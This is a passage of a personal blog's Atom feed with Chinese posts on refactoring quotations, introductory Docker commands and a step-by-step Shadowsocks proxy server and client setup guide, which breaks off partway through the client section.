<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-29T00:18:27+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Knowledge Has No Limit</title><subtitle>Life doesn't just happen to you; you receive everything in your life based on what you've given. 生命中的一切都不是巧合，你得到什么，是源于你付出了什么。</subtitle><author><name>Zhao Rengui</name></author><entry><title type="html">重构</title><link href="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2020/08/25/refacting-2/" rel="alternate" type="text/html" title="重构" /><published>2020-08-25T00:00:00+08:00</published><updated>2020-08-25T00:00:00+08:00</updated><id>http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2020/08/25/refacting-2</id><content type="html" xml:base="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2020/08/25/refacting-2/">&lt;blockquote&gt;
  &lt;p&gt;Interestingly, if programmers work with a substantial portion of the code, rather than just a few lines, the chance of making acorrect modification improves.
Specifically, as the number of lines changed increases from one to five lines, the chance of making a bad change increases. After that, the chance of making a bad change decreases.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/thinking-1.png&quot; alt=&quot;The number of code line&quot; /&gt;&lt;/p&gt;</content><author><name>zrg</name></author><category term="Thinking" /><summary type="html">Interestingly, if programmers work with a substantial portion of the code, rather than just a few lines, the chance of making acorrect modification improves. Specifically, as the number of lines changed increases from one to five lines, the chance of making a bad change increases. After that, the chance of making a bad change decreases.</summary></entry><entry><title type="html">Docker Notes</title><link href="http://localhost:4000/docker/2020/08/12/docker-notes/" rel="alternate" type="text/html" title="Docker Notes" /><published>2020-08-12T00:00:00+08:00</published><updated>2020-08-12T00:00:00+08:00</updated><id>http://localhost:4000/docker/2020/08/12/docker-notes</id><content type="html" xml:base="http://localhost:4000/docker/2020/08/12/docker-notes/">&lt;p&gt;
My email address: zrg1390556486@gmail.com
&lt;/p&gt;

&lt;div id=&quot;outline-container-org3e12039&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org3e12039&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 简介 Introduction&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdc71ad2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdc71ad2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 什么是 Docker？&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的维护效率，降低了云计算应用开发的成本！使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！
无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，节约有限的生命。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdb422aa&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdb422aa&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 为什么要使用 Docker?&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;更高效的利用系统资源&lt;/li&gt;
&lt;li&gt;更快速的启动时间&lt;/li&gt;
&lt;li&gt;一致的运行环境&lt;/li&gt;
&lt;li&gt;持续交付和部署&lt;/li&gt;
&lt;li&gt;更轻松的迁移&lt;/li&gt;
&lt;li&gt;更轻松的维护和扩展&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
对比传统虚拟机总结
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;特性&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;容器&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;虚拟机&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;启动&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;秒级&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;分钟级&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;硬盘使用&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般为 MB&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般为 GB&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;性能&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;接近原生&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;弱于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;系统支持量&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;单机支持上千个容器&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般几十个&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org61fe82d&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org61fe82d&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; 基本概念&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
镜像(Image)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
Docker 镜像，就相当于是一个 root 文件系统。比如官方镜像 ubuntu:18.04 就包含了完整的一套 Ubuntu 18.04 最小系统的 root 文件系统。

Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
分层存储
Docker 利用了 &lt;a href=&quot;https://en.wikipedia.org/wiki/Union_mount&quot;&gt;Union FS&lt;/a&gt; 的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
镜像构建时，会一层层构建，前一层是后一层的基础。在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
容器(Container)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。

容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。

每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为容器存储层。
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;仓库(Repository)
&lt;b&gt;Docker Registry&lt;/b&gt; &lt;br /&gt;
&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/repository/registry.html&quot;&gt;Docker Registry&lt;/a&gt; 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。
&lt;br /&gt;
&lt;b&gt;Docker Registry 公开服&lt;/b&gt; &lt;br /&gt;
开放给用户使用、允许用户管理镜像的 Registry 服务。一般这类公开服务允许用户免费上传、下载公开的镜像，并可能提供收费服务供用户管理私有镜像。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc879d25&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgc879d25&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 常见操作&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5f955ac&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5f955ac&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; image&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;$ docker search ubuntu
$ docker pull ubuntu:18.04 // &amp;#33719;&amp;#21462;&amp;#38236;&amp;#20687;
$ docker images
$ docker image ls -a // &amp;#26174;&amp;#31034;&amp;#21253;&amp;#25324;&amp;#20013;&amp;#38388;&amp;#23618;&amp;#38236;&amp;#20687;&amp;#30340;&amp;#25152;&amp;#26377;&amp;#38236;&amp;#20687;
$ docker image rm xxx
$ docker history nginx:v2 // &amp;#26597;&amp;#30475;&amp;#38236;&amp;#20687;&amp;#20869;&amp;#30340;&amp;#21382;&amp;#21490;&amp;#35760;&amp;#24405;
$ docker system df // &amp;#26597;&amp;#30475;&amp;#38236;&amp;#20687;&amp;#12289;&amp;#23481;&amp;#22120;&amp;#12289;&amp;#25968;&amp;#25454;&amp;#21367;&amp;#25152;&amp;#21344;&amp;#29992;&amp;#30340;&amp;#31354;&amp;#38388;
$ docker image prune // &amp;#21024;&amp;#38500;&amp;#34394;&amp;#24748;&amp;#38236;&amp;#20687;(dangling image)&amp;#65288;&amp;#26082;&amp;#27809;&amp;#26377;&amp;#20179;&amp;#24211;&amp;#21517;&amp;#65292;&amp;#20063;&amp;#27809;&amp;#26377;&amp;#26631;&amp;#31614;&amp;#65292;&amp;#22343;&amp;#20026; &amp;lt;none&amp;gt;&amp;#65289;
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
// 修改、提交镜像（Modify and commit image）
$ docker run -t -i training/sinatra /bin/bash // 先使用下载的镜像启动容器。记下容器ID

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-orgc7cdafb&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgc7cdafb&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 参考资料 References&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/&quot;&gt;Docker — 从入门到实践&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Union_mount&quot;&gt;Union FS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Docker" /><summary type="html">My email address: zrg1390556486@gmail.com</summary></entry><entry><title type="html">重构</title><link href="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2020/08/11/refacting-1/" rel="alternate" type="text/html" title="重构" /><published>2020-08-11T00:00:00+08:00</published><updated>2020-08-11T00:00:00+08:00</updated><id>http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2020/08/11/refacting-1</id><content type="html" xml:base="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2020/08/11/refacting-1/">&lt;blockquote&gt;
  &lt;p&gt;再庞大复杂的代码都可以通过重构❨refacting❩加以改善 ——Gerald Weinberg&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;注释不应当被用来为拙劣代码的存在而辩护。“不要为拙劣的代码编写文档–应当重写代码”（Kernighan and Plauger 1978）&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>zrg</name></author><category term="Thinking" /><summary type="html">再庞大复杂的代码都可以通过重构❨refacting❩加以改善 ——Gerald Weinberg</summary></entry><entry><title type="html">使用 Shadowsocks + SwitchyOmega 科学上网</title><link href="http://localhost:4000/network/software/2019/06/23/shadowsocks-switchyOmega-cn/" rel="alternate" type="text/html" title="使用 Shadowsocks + SwitchyOmega 科学上网" /><published>2019-06-23T00:00:00+08:00</published><updated>2019-06-23T00:00:00+08:00</updated><id>http://localhost:4000/network/software/2019/06/23/shadowsocks-switchyOmega-cn</id><content type="html" xml:base="http://localhost:4000/network/software/2019/06/23/shadowsocks-switchyOmega-cn/">&lt;p&gt;
本文内容仅作交流学习和查阅技术资料之用，请勿用于商业用途！如造成任何后果，本文作者概不负责。谢谢您的关注！
&lt;/p&gt;

&lt;div class=&quot;org-center&quot;&gt;
&lt;p&gt;
如果您有任何问题或建议，可以发送邮件到 zrg1390556487@gmail.com
&lt;/p&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org6cebaac&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org6cebaac&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 服务端&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdae77d7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdae77d7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 服务部署第一步&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;p&gt;
首先，购买一台境外云服务器
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;搬瓦工&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.digitalocean.com&quot;&gt;DigitalOcean&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;AWS&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vultr.com&quot;&gt;Vultr&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd3325fa&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd3325fa&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 安装和配置 Shadowsocks&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装 pip
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// CentOS
# yum install python-pip
&lt;/pre&gt;

&lt;p&gt;
或者:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot;
# python get-pip.py
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
安装及配置 shadowsocks
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 使用 pip 安装 shadowsocks
# pip install shadowsocks
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
// 也可以选择自动安装脚本
&lt;/pre&gt;

&lt;p&gt;
&lt;a href=&quot;https://github.com/zhaorengui/article/blob/master/network/install-shadowsocks.sh&quot;&gt;install-shadowsocks.sh&lt;/a&gt;
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
// 配置 shadowsocks
# vim /etc/shadowsocks.json
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;{
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server&quot;&lt;/span&gt;: &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;123.123.123.123&quot;&lt;/span&gt;,
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server_port&quot;&lt;/span&gt;: 8388,
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;local_address&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;,
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;local_port&quot;&lt;/span&gt;:1080,
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;port_password&quot;&lt;/span&gt;:{
          &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;9001&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password9001&quot;&lt;/span&gt;,
          &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;9002&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password9002&quot;&lt;/span&gt;,
          &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;9003&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password9003&quot;&lt;/span&gt;
     },
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password&quot;&lt;/span&gt;,
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;method&quot;&lt;/span&gt;: &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;,
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;timeout&quot;&lt;/span&gt;:600
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-txt&quot;&gt;解释: 
- &quot;server&quot;: &quot;123.123.123.123&quot; :: 服务器 IP 地址
- &quot;server_port&quot;: 8388 :: 服务器端口号
- &quot;local_address&quot;:&quot;127.0.0.1&quot; :: 本地回环地址
- &quot;local_port&quot;:1080, :: 本地端口号
- &quot;port_password&quot; :: 映射端口和密码
- &quot;password&quot;: &quot;password&quot; :: 密码
- &quot;method&quot;: &quot;aes-256-cfb&quot; :: 加密方式，详细可参考 [[http://ucdok.com/project/generate_password.html][password tool]]
- &quot;timeout&quot;:600 :: 超时时间
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;
配置自启动脚本
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# vim /etc/systemd/system/shadowsocks.service
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;[Unit]
&lt;span style=&quot;color: #FD971F;&quot;&gt;Description&lt;/span&gt;=Shadowsocks

[Service]
&lt;span style=&quot;color: #FD971F;&quot;&gt;TimeoutStartSec&lt;/span&gt;=0
&lt;span style=&quot;color: #FD971F;&quot;&gt;ExecStart&lt;/span&gt;=/usr/bin/ssserver -c /etc/shadowsocks.json

[Install]
&lt;span style=&quot;color: #FD971F;&quot;&gt;WantedBy&lt;/span&gt;=multi-user.target
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
设置 shadowsocks 自启动
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# systemctl enable shadowsocks
# systemctl start shadowsocks
# systemctl status shadowsocks -l
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5bb723e&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5bb723e&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; 使用 Docker 安装 Shadowsocks&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装 docker
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# yum install docker
# systemctl enable docker
# systemctl start docker
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
部署 Shadowsocks
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# docker run -dt --name ss -p 6443:6443 mritd/shadowsocks -s &quot;-s 0.0.0.0 -p 6443 -m aes-256-cfb -k test123 --fast-open&quot;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7679133&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org7679133&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 客户端&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;p&gt;
目前支持以下客户端进行连接：
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;Linux&lt;/li&gt;
&lt;li&gt;Windows&lt;/li&gt;
&lt;li&gt;Mac OS X&lt;/li&gt;
&lt;li&gt;Android&lt;/li&gt;
&lt;li&gt;IOS&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2cd4d24&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2cd4d24&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; Linux&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4897bb9&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org4897bb9&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.1&lt;/span&gt; 安装、配置和使用 Linux Shadowsocks 客户端&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
Linux 系列
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
Debian/Ubuntu:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install python-pip
$ sudo pip install shadowsocks
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Fedora/Centos:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo yum install python-setuptools
&lt;/pre&gt;

&lt;p&gt;
or
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo dnf install python-setuptools
$ sudo easy_install pip
$ sudo pip install shadowsocks
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
OpenSUSE:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo zypper install python-pip
$ sudo pip install shadowsocks
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Archlinux:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo pacman -S python-pip
sudo pip install shadowsocks
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
sslocal 是客户端软件，ssserver 是服务端软件，常见于 Linux 发行版，如 Ubuntu。sslocal 在 &lt;i&gt;usr/local/bin 目录下，也有其他发行版在 /usr/bin&lt;/i&gt; 目录下，可以使用 whereis 命令找到它的位置。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ whereis sslocal
&lt;/pre&gt;

&lt;p&gt;
sslocal: /usr/local/bin/sslocal
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/shadowsocks.json
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;{
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server-ip&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server_port&quot;&lt;/span&gt;:8000,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;local_address&quot;&lt;/span&gt;: &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;local_port&quot;&lt;/span&gt;:1080,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;your-password&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;timeout&quot;&lt;/span&gt;:600,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
// 启动
$ sudo sslocal -c /etc/shadowsocks.json
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
// 后台运行
$ sudo sslocal -c /etc/shadowsocks.json -d start
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/rc.local
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/rc.local
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;sudo sslocal -c /etc/shadowsocks.json -d start
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
// 检查是否正常工作
# sudo systemctl status rc-local.service
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8d0ac85&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8d0ac85&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.2&lt;/span&gt; 开启全局代理&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装及配置 polipo
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt install polipo
$ sudo vim /etc/polipo/config
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org4104971&quot;&gt;&lt;span style=&quot;color: #FD971F;&quot;&gt;logSyslog&lt;/span&gt; = true
&lt;span style=&quot;color: #FD971F;&quot;&gt;logFile&lt;/span&gt; = /var/log/polipo/polipo.log
&lt;span style=&quot;color: #FD971F;&quot;&gt;proxyAddress&lt;/span&gt; = &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;0.0.0.0&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FD971F;&quot;&gt;socksParentProxy&lt;/span&gt; = &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;127.0.0.1:1080&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FD971F;&quot;&gt;socksProxyType&lt;/span&gt; = socks5
&lt;span style=&quot;color: #FD971F;&quot;&gt;chunkHighMark&lt;/span&gt; = 50331648
&lt;span style=&quot;color: #FD971F;&quot;&gt;objectHighMark&lt;/span&gt; = 16384
&lt;span style=&quot;color: #FD971F;&quot;&gt;serverMaxSlots&lt;/span&gt; = 64
&lt;span style=&quot;color: #FD971F;&quot;&gt;serverSlots&lt;/span&gt; = 16
&lt;span style=&quot;color: #FD971F;&quot;&gt;serverSlots1&lt;/span&gt; = 32
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
重启 polipo
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo systemctl restart polipo
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设置全局变量 http_proxy and https_proxy
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ export http_proxy=&quot;http://127.0.0.1:8123/&quot;
$ export https_proxy=&quot;https://127.0.0.1:8123/&quot;
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
测试
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ curl www.google.com
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgfb11996&quot; class=&quot;outline-4&quot;&gt;
